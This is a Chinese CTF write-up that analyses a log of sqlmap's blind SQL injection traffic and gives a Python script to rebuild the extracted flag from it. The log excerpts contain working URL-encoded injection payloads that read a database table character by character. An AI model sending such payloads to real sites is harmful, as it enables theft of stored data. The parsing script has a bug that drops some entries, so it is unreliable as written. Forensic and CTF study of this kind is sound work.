今天下午一个CTF比赛，师兄给了一个文件，内容大致如下

```
/index.php%3fid=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C17%2C1%29%29%3E108[K<br><br><font color = "red">你当前执行的语句是:SELECT * from news where id =1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORD[m[KER BY flag_here LIMIT 0,1),17,1))>108</font><br><br>   
/index.php%3fid=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C17%2C1%29%29%3E108   id：1<br><br>
```

*以上省略接近1500行。*

文件是使用`sqlmap`进行**二分查找**盲注的流量包，太复杂看着晃眼，把重复的地方删除后整理成了如下格式

```
171%29%29%3E108[K你当前执行的语句是:SELECT * from news where id =1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORD[m[KER BY flag_here LIMIT 0,1),17,1))>108</font><br><br>   
171%29%29%3E108   id：1<br><br>
171%29%29%3E108 用户名:admin<br><br>
171%29%29%3E108  Blog地址:www.duwentao.top<br><br>
171%29%29%3E108 频道:<font color = "red"><a href="https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA">点此订阅</a></font>

191%29%29%3E112[K你当前执行的语句是:SELECT * from news where id =1 AND ORD(MID((SELECT IFNULL(CAST(flag_here AS CHAR),0x20) FROM sqltest.flag ORD[m[KER BY flag_here LIMIT 0,1),19,1))>112</font><br><br>   
191%29%29%3E112   id：1<br><br>
191%29%29%3E112 用户名:admin<br><br>
191%29%29%3E112  Blog地址:www.duwentao.top<br><br>
191%29%29%3E112 频道:<font color = "red"><a href="https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA">点此订阅</a></font>
```

流量大概每五行为一组，仔细观察每一组的第二行，例如

```
171%29%29%3E108   id：1<br><br>
```

可以分成这么几部分`17`、`1%29%29%3E`、`108`、`   id：`、`1`、`<br><br>`

- `17`：第几位字符
- `1%29%29%3E`：与注入无关
- `108`：字符所表示的ASCII
- `   id：`：与注入有那么一点儿关系
- `1`：注入是否成功的标志。成功显示1，失败无显示
- `<br><br>`：与注入无关

因此只要匹配出三个地方`17`、`108`、`1`，再利用二分查找的特点，即可精确推出每一位字符。

# Python脚本

少废话，先看东西。

```python
import re


def main():
    rawData = []
    with open('h1.txt', 'r', encoding='utf-8') as f:
        rawData = f.readlines()
    # print(len(rawData))

    # pattern = re.compile('(\d+)%29%29%3E(\d+)   id：(1)?<br><br>')
    pattern = re.compile('(\d{1,2})1%29%29%3E(\d+)\s+id：(\d)?<br><br>')

    strLen = 0
    resultDict = {}
    for each in range(250):
        m = pattern.search(rawData[1+each*6])
        # print(m.group(1))
        # print(m.group(2))
        # print(m.group(3))
        m1 = int(m.group(1))
        m2 = int(m.group(2))
        m3 = 0
        if m.group(3) != None:
            m3 = 1
        # print(m3)
        if  m1 > strLen:
            strLen = m1
        
        if resultDict.get(m1):
            if m3 == 1:
                if m2 > resultDict[m1]['s']:
                    resultDict[m1]['s'] = m2
            else:
                if m2 < resultDict[m1]['b']:
                    resultDict[m1]['b'] = m2
                    
        else:                    
            if m3 == 1:
                tempDict = {
                    'character': m1,
                    's': m2,
                    'b': 1000,
                }
            else:
                tempDict = {
                    'character': m1,
                    's': 0,
                    'b': m2,
                }
                resultDict[m1] = tempDict
    # print(strLen) # 长度为20
    for each in range(strLen):
        print(chr(resultDict[each+1]['b']), end='')



if __name__ == '__main__':
    main()
```

# 后记

正常的输出结果中，`b`和`s`的差值是`1`，但输出结果中有一位差值并不是，但但是我`print`的时候是输出的`b`，所以并没有影响最终结果。
